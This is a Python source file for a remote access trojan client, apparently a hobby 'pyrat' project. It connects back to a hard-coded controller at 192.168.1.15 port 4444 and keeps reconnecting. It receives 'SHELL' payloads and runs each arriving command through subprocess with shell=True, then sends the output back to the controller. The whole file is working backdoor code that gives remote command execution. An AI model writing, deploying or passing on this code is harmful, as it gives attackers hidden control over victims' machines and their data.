import socket, customSocket, time, traceback, threading, subprocess

class Client:

    def __init__(self):
        self.actionPool = []
        self.payloadPool = []
        self.stopAll = False
        self.threads = []

    def payloadShell(self, sock, code):

        def run_command(command):
            p = subprocess.Popen(command,
                         stdout=subprocess.PIPE,
                         stderr=subprocess.STDOUT,
                         shell=True)
            print(p)
            print(p.stdout)
            return iter(p.stdout.readline, b'')

        while self.stopAll == False:
            time.sleep(0.5)
            toDelPayloadPool = []

            for i in self.payloadPool:
                if i[0] == code:
                    print(f"RECEIVED {i[1]} for code {code}")
                    toDelPayloadPool.append(i)
                    # Faire les check get; put etc... ici

                    command = i[1]
                    output = run_command(command)
                    buff = ""
                    for line in output:
                        print(line)
                        buff += f"{line}\n"
                    sock.ratSend(f"{code}:OUTPUTSHELL:{buff}&")

            for i in range(len(toDelPayloadPool)):

                    toDelPayloadPoolCopy = self.payloadPool.copy()
                    del self.payloadPool[toDelPayloadPoolCopy.index(toDelPayloadPool[i])]        

    
    def start(self):
        s = customSocket.pyratSocket()

        while True:
            try:
                
                s.ratConnect("192.168.1.15", 4444)

                while True:

                    payload = ""
                    patate = s.ratReceive(8192, "&").strip("&")
                    print(patate)
                    if "PAYLOAD" in patate:
                        payload = patate.split(":")[1]
                        print(f"Got payload : {payload}")
                        if payload == "SHELL":
                            t = threading.Thread(target=self.payloadShell, args=(s, patate.split(":")[2].split("=")[1]))
                            t.start()
                            self.threads.append(t)
                    elif "ACTION" in patate:
                        self.payloadPool.append((patate.split(":")[1], patate.split(":")[2]))

                     
            except KeyboardInterrupt:
                print("KB interr")
                self.stopAll = True
                for i in self.threads:
                    i.join()
            except Exception as e:
                #s.ratDisconnect()
                try:
                    print(e)
                    traceback.print_exc()
                    time.sleep(1.5)
                except KeyboardInterrupt:
                    print("KB interr")
                    self.stopAll = True
                    for i in self.threads:
                        i.join()

if __name__ == "__main__":
    c = Client()
    c.start()